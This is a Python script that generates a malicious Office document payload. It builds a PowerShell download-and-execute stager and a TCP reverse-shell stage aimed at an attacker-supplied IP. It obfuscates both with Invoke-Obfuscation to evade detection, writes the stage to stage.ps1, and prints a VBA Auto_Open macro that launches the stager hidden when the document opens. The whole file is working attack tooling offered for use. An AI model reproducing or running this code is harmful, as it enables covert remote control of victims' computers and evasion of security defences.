import sys
import subprocess
from termcolor import colored


def info_print(s):
    print(colored('[*]', 'green'), s)


def run_powershell(cmd):
    return subprocess.Popen(['pwsh', '-Command', cmd], stdout=subprocess.PIPE)


def invoke_obfuscation(script_block, command):
    return "Import-Module ./Invoke-Obfuscation/Invoke-Obfuscation.psd1;" \
           f"Invoke-Obfuscation -Quiet -Command '{command}' -ScriptBlock {{ {script_block} }}"


def get_obfuscated_payload(payload, command):
    p = run_powershell(invoke_obfuscation(payload, command))
    stdout, _ = p.communicate()
    return stdout.decode().strip()


if __name__ == '__main__':
    if len(sys.argv) == 4:
        _, ip, http_port, tcp_port = sys.argv
        obfuscation_command = "Token/All/1"
    elif len(sys.argv) == 5:
        _, ip, http_port, tcp_port, obfuscation_command = sys.argv
    else:
        print(
            f"""
Usage:
    {sys.argv[0]} ip http_port tcp_port <obfuscation_command>
    
    ip - attacker's ip address
    http_port - http server port that serves "stage.ps1"
    tcp_port - tcp server port that listens for reverse shell
    obfuscation_command - (OPTIONAL) "-Command" parameter passed to Invoke-Obfuscation. 
        By default: "Token/All/1"
        """
        )
        exit(-1)

    CLEAN_STAGER = f"IEX (New-Object Net.WebClient).DownloadString('http://{ip}:{http_port}/stage.ps1')"
    CLEAN_STAGE = f"""$client = New-Object System.Net.Sockets.TCPClient('{ip}',{tcp_port});$stream = 
$client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | 
Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes(
$sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close();
$sm=(New-Object Net.Sockets.TCPClient('{ip}',{tcp_port})).GetStream();[byte[]]$bt=0..65535|%{{0}};while((
$i=$sm.Read($bt,0,$bt.Length)) -ne 0){{;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([
text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}}""".replace('\n', '')

    obfuscated_stager = get_obfuscated_payload(CLEAN_STAGER, obfuscation_command)
    obfuscated_stager = obfuscated_stager.replace('"', "'")
    obfuscated_stage = get_obfuscated_payload(CLEAN_STAGE, obfuscation_command)

    with open('stage.ps1', 'w') as f:
        f.write(obfuscated_stage)

    info_print("Obuscated stage saved to stage.ps1.")
    info_print("Generating vba payload...")
    print(f"""
Sub lulz()
    strCommand = "powershell -windowstyle hidden {obfuscated_stager}"
    Set WshShell = CreateObject("WScript.Shell")
    Set WshShellExec = WshShell.Exec(strCommand)
    strOutput = WshShellExec.StdOut.ReadAll
End Sub
Sub Auto_Open()
    lulz
End Sub
    """)
    info_print("You need to start the following servers:")
    print(f"HTTP server - {ip}:{http_port}")
    print(f"TCP server - {ip}:{tcp_port}")
